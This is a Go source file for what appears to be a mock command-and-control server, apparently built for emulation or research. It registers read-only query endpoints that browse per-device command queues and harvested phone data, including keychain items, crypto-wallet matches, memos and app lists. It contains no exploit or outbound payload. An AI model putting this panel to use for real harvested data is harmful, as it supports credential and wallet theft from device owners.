package server

import (
	"net/http"
	"regexp"

	"mockc2/internal/store"
)

// 只读查询面：/__q —— DB 元信息库的只读 REST 视图。

var querySafeRe = regexp.MustCompile(`^[A-Za-z0-9_.-]+$`)

var metaFields = map[string]bool{
	"deviceVersion": true, "domain": true,
	"uuid": true, "status": true, "type": true, "machine": true, "hostname": true,
	"ios_version": true, "build_version": true,
	"command_id": true, "_task_type": true, "filename": true, "error": true,
	"signal": true, "lhu": true, "source": true,
	"list_count": true, "apps_count": true, "db_files_count": true, "wallets_count": true,
	"app_sample": true, "note_title": true, "db_file": true, "_hint": true,
}

func qLimit(r *http.Request) int {
	n := queryInt(r, "limit", 500)
	if n <= 0 {
		return 500
	}
	if n > 2000 {
		return 2000
	}
	return n
}

func registerQuery(rt *Router) {
	rt.GET("/__q/devices", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		writeJSON(w, http.StatusOK, store.ListDevicesTable())
	})

	rt.GET("/__q/timeline/{ip}", func(w http.ResponseWriter, r *http.Request, p map[string]string) {
		ip := p["ip"]
		if ip == "" || len(ip) > 64 {
			writeJSON(w, http.StatusBadRequest, map[string]any{"error": "bad ip"})
			return
		}
		writeJSON(w, http.StatusOK, store.DeviceTimeline(ip, qLimit(r)))
	})

	rt.GET("/__q/packets/{endpoint}", func(w http.ResponseWriter, r *http.Request, p map[string]string) {
		ep := p["endpoint"]
		if !querySafeRe.MatchString(ep) {
			writeJSON(w, http.StatusBadRequest, map[string]any{"error": "bad endpoint"})
			return
		}
		since := queryFloatPtr(r, "since_epoch")
		if r.URL.Query().Get("since_epoch") != "" && since == nil {
			writeJSON(w, http.StatusBadRequest, map[string]any{"error": "bad since_epoch"})
			return
		}
		writeJSON(w, http.StatusOK, store.PacketsByEndpoint(ep, qLimit(r), since))
	})

	rt.GET("/__q/packet/{packet_id}", func(w http.ResponseWriter, r *http.Request, p map[string]string) {
		pid, err := parseInt64(p["packet_id"])
		if err != nil || pid <= 0 {
			writeJSON(w, http.StatusBadRequest, map[string]any{"error": "bad id"})
			return
		}
		row := store.PacketDetail(pid)
		if row == nil {
			writeJSON(w, http.StatusNotFound, map[string]any{"error": "not found"})
			return
		}
		writeJSON(w, http.StatusOK, row)
	})

	rt.GET("/__q/meta", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		field := r.URL.Query().Get("field")
		if !metaFields[field] {
			writeJSON(w, http.StatusBadRequest, map[string]any{"error": "field not allowed"})
			return
		}
		vLike := r.URL.Query().Get("value_like")
		if vLike != "" && (len(vLike) > 128 || containsAny(vLike, "%_")) {
			writeJSON(w, http.StatusBadRequest, map[string]any{"error": "bad value_like"})
			return
		}
		writeJSON(w, http.StatusOK, store.SearchMeta(field, vLike, qLimit(r)))
	})

	rt.GET("/__q/commands", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		writeJSON(w, http.StatusOK, store.CommandRecent(qLimit(r)))
	})

	rt.GET("/__q/stats", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		writeJSON(w, http.StatusOK, store.DBStats())
	})

	rt.GET("/__q/wallets", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		limit := queryInt(r, "limit", 20)
		writeJSON(w, http.StatusOK, store.Summary("", limit))
	})

	rt.GET("/__q/wallets_rules", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		writeJSON(w, http.StatusOK, store.GetDB().Query("SELECT rule_name, patterns FROM wallet_rules ORDER BY id"))
	})

	// 按设备独立指令队列：总览 + 明细（前端设备控制台）
	rt.GET("/__q/device_command_targets", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		writeJSON(w, http.StatusOK, store.GetQueue().ListTargets())
	})

	rt.GET("/__q/device_commands", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		target := r.URL.Query().Get("target")
		if target == "" {
			writeJSON(w, http.StatusBadRequest, map[string]any{"error": "target required"})
			return
		}
		writeJSON(w, http.StatusOK, store.GetQueue().ListByTarget(target, qLimit(r)))
	})

	// ── 完整解析层只读视图（apps/keychain/memos/result/profiles）──
	rt.GET("/__q/apps", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		kw := r.URL.Query().Get("kw")
		page := queryInt(r, "page", 1)
		per := queryInt(r, "per", 40)
		writeJSON(w, http.StatusOK, store.ListApps(kw, page, per))
	})

	rt.GET("/__q/keychain_items", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		kw := r.URL.Query().Get("kw")
		tbl := r.URL.Query().Get("tbl")
		wallet := r.URL.Query().Get("wallet")
		device := r.URL.Query().Get("device")
		page := queryInt(r, "page", 1)
		per := queryInt(r, "per", 40)
		writeJSON(w, http.StatusOK, store.ListKeychainItems(kw, tbl, wallet, device, page, per))
	})

	rt.GET("/__q/keychain_devices", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		writeJSON(w, http.StatusOK, store.KeychainDevices())
	})

	rt.GET("/__q/memos", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		kw := r.URL.Query().Get("kw")
		page := queryInt(r, "page", 1)
		per := queryInt(r, "per", 40)
		writeJSON(w, http.StatusOK, store.ListMemos(kw, page, per))
	})

	rt.GET("/__q/result_data", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		kw := r.URL.Query().Get("kw")
		page := queryInt(r, "page", 1)
		per := queryInt(r, "per", 40)
		writeJSON(w, http.StatusOK, store.ListResultData(kw, page, per))
	})

	rt.GET("/__q/profiles", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		writeJSON(w, http.StatusOK, store.ListProfiles())
	})

	rt.GET("/__q/full_stats", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		writeJSON(w, http.StatusOK, store.FullParseStats())
	})
}

func containsAny(s, chars string) bool {
	for _, c := range chars {
		for _, sc := range s {
			if sc == c {
				return true
			}
		}
	}
	return false
}
